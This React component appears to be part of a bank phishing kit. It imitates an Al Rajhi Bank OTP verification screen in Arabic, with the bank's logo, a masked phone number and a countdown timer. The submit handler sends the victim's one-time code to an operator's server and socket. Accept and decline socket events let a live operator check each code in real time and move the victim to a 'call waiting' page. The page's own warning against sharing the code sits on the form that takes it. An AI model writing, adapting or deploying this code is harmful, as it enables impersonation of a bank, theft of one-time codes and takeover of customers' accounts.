import React, { useEffect, useMemo, useRef, useState } from "react";
import axios from "axios";
import { TailSpin } from "react-loader-spinner";
import { FaChevronLeft } from "react-icons/fa6";
import { useNavigate } from "react-router-dom";
import { api_route, socket } from "../App";
import { useSocketEvent } from "../hooks/useSocketEvent";
import { useCountdown } from "../hooks/useCountdown";

function maskPhone(phone) {
  const digits = (phone || "").replace(/\D/g, "");
  if (digits.length < 4) return "+966 05* **** ******";
  let local = digits;
  if (local.startsWith("966")) local = local.slice(3);
  if (local.startsWith("0")) local = local.slice(1);
  const prefix = local.length >= 2 ? local.slice(0, 2) : "5";
  return `+966 0${prefix[0]}* **** ******`;
}

const OTP_LENGTH = 4;

const RajhiOtp = () => {
  const navigate = useNavigate();
  const search = window.location.search;
  const data = useMemo(() => {
    try {
      const raw = new URLSearchParams(search).get("data");
      if (!raw) return null;
      return JSON.parse(raw);
    } catch {
      return null;
    }
  }, [search]);

  const _id = data?._id || sessionStorage.getItem("id");
  const maskedPhone = maskPhone(data?.phoneNumber || data?.phone);
  const [digits, setDigits] = useState(Array(OTP_LENGTH).fill(""));
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState(false);
  const inputRefs = useRef([]);
  const { formattedMinutes, formattedSeconds } = useCountdown(60);

  const otp = digits.join("");
  const canSubmit = otp.length === OTP_LENGTH;

  useEffect(() => {
    window.scrollTo(0, 0);
  }, []);

  const handleChange = (index, value) => {
    const num = value.replace(/\D/g, "").slice(-1);
    const next = [...digits];
    next[index] = num;
    setDigits(next);
    setError(false);
    if (num && index < OTP_LENGTH - 1) {
      inputRefs.current[index + 1]?.focus();
    }
  };

  const handleKeyDown = (index, e) => {
    if (e.key === "Backspace" && !digits[index] && index > 0) {
      inputRefs.current[index - 1]?.focus();
    }
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    if (!_id || !canSubmit) return;
    setLoading(true);
    setError(false);
    try {
      await axios.post(`${api_route}/rajhiOtp/${_id}`, { rajhiOtp: otp });
      socket.emit("rajhiOtp", { _id, id: _id, rajhiOtp: otp });
    } catch {
      setLoading(false);
    }
  };

  useSocketEvent("acceptRajhiOtp", (id) => {
    if (id !== _id) return;
    setLoading(false);
    navigate(
      `/rajhi-call-waiting?data=${encodeURIComponent(
        JSON.stringify({ ...data, _id }),
      )}`,
    );
  });

  useSocketEvent("declineRajhiOtp", (id) => {
    if (id !== _id) return;
    setLoading(false);
    setError(true);
    setDigits(Array(OTP_LENGTH).fill(""));
    inputRefs.current[0]?.focus();
  });

  return (
    <div
      className="min-h-screen w-full max-w-md mx-auto flex flex-col"
      dir="rtl"
    >
      <div className="bg-white px-6 pt-4 pb-10">
        <div className="flex items-center justify-between mb-4">
          <div className="flex items-start gap-2">
            <img src="/otp_rajhi.jpeg" alt="Al Rajhi" className="w-26 " />
          </div>
          <button
            type="button"
            className="flex items-center gap-1 text-[#1e3a8a] text-sm font-bold"
          >
            عودة
            <FaChevronLeft className="text-xs" />
          </button>
        </div>
      </div>

      <div className="flex-1 bg-white rounded-t-3xl -mt-10 px-6 pt-8 pb-10 relative">
        {loading && (
          <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/30">
            <div className="flex flex-col items-center gap-4 bg-white p-8 rounded-md shadow-lg">
              <TailSpin
                height="40"
                width="40"
                color="#1e3a8a"
                ariaLabel="loading"
              />
              <span className="text-gray-700 font-medium">جاري التحقق...</span>
            </div>
          </div>
        )}

        <div className="flex justify-center mb-6">
          <div className="relative w-24 h-24 flex items-center justify-center">
            <div className="absolute inset-0 rounded-full border-2 border-[#dbeafe] opacity-60 scale-110" />
            <div className="absolute inset-2 rounded-full border-2 border-[#bfdbfe] opacity-80 scale-105" />
            <svg width="48" height="48" viewBox="0 0 48 48" fill="none">
              <path
                d="M24 4L6 10v10c0 11 7.5 21.2 18 24 10.5-2.8 18-13 18-24V10L24 4z"
                fill="#2563eb"
                opacity="0.15"
              />
              <path
                d="M24 6L8 11v9c0 9.5 6.5 18.2 16 20.8 9.5-2.6 16-11.3 16-20.8v-9L24 6z"
                fill="#2563eb"
              />
              <rect x="20" y="18" width="8" height="10" rx="1" fill="white" />
              <path
                d="M22 18v-2a2 2 0 0 1 4 0v2"
                stroke="white"
                strokeWidth="2"
                fill="none"
              />
            </svg>
          </div>
        </div>

        <h1 className="text-2xl font-bold text-[#1e3a8a] text-center mb-3">
          رمز التحقق
        </h1>
        <p className="text-sm text-gray-500 text-center leading-relaxed mb-2 px-2">
          تم إرسال رمز التحقق إلى رقم الجوال المسجل في البنك. يرجى إدخال الرمز
          لإكمال توثيق حسابك البنكي
        </p>
        <p
          className="text-base font-semibold text-gray-800 text-center mb-8"
          dir="ltr"
        >
          {maskedPhone}
        </p>

        <form onSubmit={handleSubmit}>
          <div className="flex justify-center gap-2 mb-6" dir="ltr">
            {digits.map((d, i) => (
              <input
                key={i}
                ref={(el) => {
                  inputRefs.current[i] = el;
                }}
                type="text"
                inputMode="numeric"
                maxLength={1}
                value={d}
                onChange={(e) => handleChange(i, e.target.value)}
                onKeyDown={(e) => handleKeyDown(i, e)}
                className={`w-11 h-12 text-center text-lg font-bold border-2 rounded-lg outline-none ${
                  i === 0 && !d
                    ? "border-[#2563eb]"
                    : "border-gray-200 focus:border-[#2563eb]"
                }`}
              />
            ))}
          </div>

          <p className="text-center text-[#2563eb] text-sm mb-6">
            إعادة إرسال الرمز خلال {formattedMinutes}:{formattedSeconds}
          </p>

          <div className="bg-[#eff6ff] rounded-xl p-4 mb-8 flex gap-3 items-center">
            <div className="w-1/5 flex items-center justify-center">
              <svg
                width="36"
                height="36"
                viewBox="0 0 28 28"
                fill="none"
                className="shrink-0 mt-0.5"
              >
                <path
                  d="M14 2L4 6v7c0 6.6 4.3 12.7 10 14.4 5.7-1.7 10-7.8 10-14.4V6L14 2z"
                  stroke="#2563eb"
                  strokeWidth="1.75"
                  strokeLinejoin="round"
                />
                <path
                  d="M11 14l2 2 4-4"
                  stroke="#2563eb"
                  strokeWidth="2"
                  strokeLinecap="round"
                  strokeLinejoin="round"
                />
              </svg>
            </div>
            <div className="w-4/5">
              <p className="text-sm font-bold text-[#1e3a8a] mb-1 ">
                لأجل أمانك
              </p>
              <p className="text-xs text-gray-600 leading-relaxed">
                لا تشارك رمز التحقق مع أي شخص. مصرف الراجحي لن يطلب منك الرمز.
              </p>
            </div>
          </div>

          {error && (
            <p className="text-red-600 text-sm text-center mb-4">
              رمز التحقق غير صحيح. يرجى المحاولة مرة أخرى.
            </p>
          )}

          <button
            type="submit"
            disabled={!canSubmit}
            className={`w-full rounded-xl py-4 text-base font-bold mb-3 transition-colors ${
              canSubmit
                ? "bg-[#1e3a8a] text-white"
                : "bg-[#e5e7eb] text-gray-400 cursor-not-allowed"
            }`}
          >
            تحقق
          </button>

          <button
            type="button"
            className="w-full rounded-xl py-4 text-base font-semibold border-2 border-[#1e3a8a] text-[#1e3a8a] mb-4"
          >
            لم يصلني الرمز
          </button>

          <button
            type="button"
            className="w-full py-2 text-[#2563eb] text-sm font-medium"
          >
            تغيير رقم الجوال
          </button>
        </form>
      </div>
    </div>
  );
};

export default RajhiOtp;
